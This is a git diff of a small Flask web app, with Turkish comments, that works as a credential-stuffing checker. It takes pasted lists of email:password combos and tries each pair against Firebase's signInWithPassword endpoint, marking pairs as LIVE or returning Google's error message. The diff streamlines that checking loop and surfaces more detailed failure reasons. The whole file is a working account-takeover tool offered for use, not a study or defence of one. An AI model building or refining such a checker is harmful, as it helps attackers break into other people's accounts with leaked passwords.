@@ -4,30 +4,29 @@ from flask import Flask, render_template, request, jsonify
 
 app = Flask(__name__)
 
-# GÜVENLİ YÖNTEM: Anahtarı kodun içine yazmıyoruz, Vercel ayarlarından çekiyoruz.
+# Anahtarı Vercel'den çekiyoruz
 API_KEY = os.getenv("FIREBASE_API_KEY")
 
 def check_account(email, password):
+    # Anahtar gelmiş mi kontrol et
     if not API_KEY:
-        return "CONFIG_ERROR"
+        return "ANAHTAR_YOK"
 
     url = f"https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key={API_KEY}"
-    payload = {
-        "email": email,
-        "password": password,
-        "returnSecureToken": True
-    }
+    payload = {"email": email, "password": password, "returnSecureToken": True}
     
     try:
-        headers = {'Content-Type': 'application/json'}
-        r = requests.post(url, json=payload, headers=headers, timeout=10)
+        r = requests.post(url, json=payload, timeout=10)
+        data = r.json()
         
         if r.status_code == 200:
             return "LIVE"
-        return "DEAD"
-    except Exception as e:
-        print(f"Hata: {e}")
-        return "ERROR"
+        
+        # Google'ın verdiği gerçek hata mesajını döndür
+        error_msg = data.get('error', {}).get('message', 'BAD')
+        return error_msg 
+    except Exception:
+        return "SISTEM_HATASI"
 
 @app.route('/')
 def index():
@@ -38,23 +37,14 @@ def start_scan():
     data = request.json
     combos = data.get('combos', '').splitlines()
     results = []
-    stats = {"live": 0, "dead": 0, "checked": 0}
-
+    
     for line in combos:
         if ":" in line:
-            parts = line.split(":", 1)
-            email, password = parts[0].strip(), parts[1].strip()
-            status = check_account(email, password)
-            
-            stats["checked"] += 1
-            if status == "LIVE":
-                stats["live"] += 1
-                results.append({"account": f"{email}:{password}", "status": "LIVE"})
-            else:
-                stats["dead"] += 1
-                results.append({"account": f"{email}:{password}", "status": "DEAD"})
+            email, password = line.split(":", 1)
+            status = check_account(email.strip(), password.strip())
+            results.append({"account": line, "status": status})
     
-    return jsonify({"results": results, "stats": stats})
+    return jsonify({"results": results})
 
 if __name__ == '__main__':
     app.run(debug=True)
